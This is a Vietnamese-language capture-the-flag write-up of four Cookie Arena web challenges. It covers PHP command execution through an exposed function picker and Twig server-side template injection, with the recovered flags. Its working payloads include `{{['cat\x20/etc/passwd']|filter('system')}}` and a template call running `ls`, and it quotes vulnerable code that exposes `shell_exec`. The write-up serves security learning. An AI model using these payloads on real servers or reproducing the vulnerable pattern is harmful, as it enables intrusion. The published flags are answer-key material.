# Web

## Content

- [HTTP Request Content-Length](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#http-request-content-length)
- [HTTP Request Transfer Encoding](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#http-request-transfer-encoding)
- [PHP Executor Playground](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/Web.md#php-executor-playground)
- [Hello Twig]()

### HTTP Request Content-Length

Challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image1.png?raw=true)

**Flag: CHH{HTTPContentLength_eb4e5beb118f2242c00d142ede3bb218}**

### HTTP Request Transfer Encoding

Challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image2.png?raw=true)

Xem source page:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image3.png?raw=true)

**Flag: CHH{HTTPTransferEncoding_d11e934c7546bacaa97b2c826878d80b}**

### PHP Executor Playground

Challenge:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image4.png?raw=true)

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image5.png?raw=true)

Xem website:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image6.png?raw=true)

Thử string là `admin` và function là `strlen`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image7.png?raw=true)

Thử string là `admin` và function là `strtoupper`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image8.png?raw=true)

Thử string là `ADMIN` và function là `strtolower`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image9.png?raw=true)

Thử string là `admin` và function là `addslashes`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image10.png?raw=true)

Thử string là `admin` và function là `print_r`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image11.png?raw=true)

Thử string là `admin` và function là `exec`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image12.png?raw=true)

Thử string là `admin` và function là `passthru`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image13.png?raw=true)

Thử string là `admin` và function là `shell_exec`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image14.png?raw=true)

Thử string là `admin` và function là `escapeshellarg`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image15.png?raw=true) 

Thử string là `admin` và function là `escapeshellcmd`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image16.png?raw=true)

Trong PHP, hàm `shell_exec` sẽ thực hiện 1 lệnh từ shell và trả về toàn bộ kết quả dưới dạng chuỗi. Hàm `exec` cũng thực hiện 1 lệnh từ shell nhưng chỉ trả về dòng cuối cùng của kết quả dưới dạng chuỗi. Hàm `passthru` thực hiện 1 lệnh từ shell và xuất trực tiếp kết quả đến browser (hoặc thiết bị đầu ra khác).

Thử nhập chuỗi `find / -name *.txt` và dùng hàm `shell_exec`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image17.png?raw=true)

Click `Execute` và có đầu ra như sau:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image18.png?raw=true)

->Tìm được file `/flag.txt`.

Thử nhập chuỗi `cat /flag.txt` và dùng hàm `passthru`:

![img](https://github.com/DucThinh47/Cookie-Arena/blob/main/Web/images/image19 .png?raw=true)

**Flag: CHH{PHPFunct1Ons_986675c073d696bff00160b9e301232e}**

### Hello Twig

![img](20)

Start challenge:

![img](21)

Xem source page:

![img](24)

Đoạn mã được thử thách cung cấp:

![img](25)

Đoạn mã sử dụng `Twig Template Engine` để hiển thị nội dung HTML động. Để ý có hàm `run` trong `PHP` – thực thi shell command:

    $twig->addFunction(new \Twig\TwigFunction('run', function ($cmd) {
        return shell_exec($cmd);
    }));

->Cho phép chạy lệnh shell từ trong template (rất nguy hiểm nếu không kiểm soát!)

Đoạn mã này có khả năng bị khai thác lỗ hổng `Server-Side Template Injection (SSTI)` — nếu người dùng có thể `điều khiển nội dung template được render`. 

->Khi nào xảy ra `SSTI`?

- Ứng dụng sử dụng một `template engine` (như `Twig`, `Jinja2`,...).
- Dữ liệu từ người dùng được truyền vào `template engine` mà không kiểm soát.
- Kẻ tấn công có thể chèn `template expression` vào (ví dụ: `{{ 7 * 7 }}`, `{{ run('ls') }}`...).

->Vấn đề trong đoạn code:

Giả sử biến `$templates` được khởi tạo từ input người dùng như sau:

    $templates = [
        'hello' => $_GET['tpl'] 
    ];

Rồi đoạn này:

    $message = $twig->render("hello");

Lúc này, nếu người dùng truy cập URL như:

    http://yourdomain.com/index.php?tpl={{ run('ls') }}

->Nó sẽ thực thi lệnh hệ thống trên server thông qua hàm `run()` mà đã `addFunction` vào `Twig`, dẫn tới `Remote Code Execution (RCE)`.

Tiếp tục nhận thấy khi nhập 1 giá trị `Your name` bất kỳ và click `Submit`, sẽ có tham số `name` xuất hiện trên URL, có thể lợi dụng tham số này để chèn payload. Truy cập "PayloadsAllTheThings/Server Side Template Injection
/PHP.md" để tìm kiếm payload:

![img](26)

Thử dùng payload `{{['cat\x20/etc/passwd']|filter('system')}}`, thay thành `{{['cat\x20/flag.txt']|filter('system')}}`:

![img](22)

->Tìm được Flag.

Nộp flag:

![img](23)

**Flag: CHH{SSTI_PHP_S1mpl3Twig_39e344b86ac999e092b87b3429386eed}**



















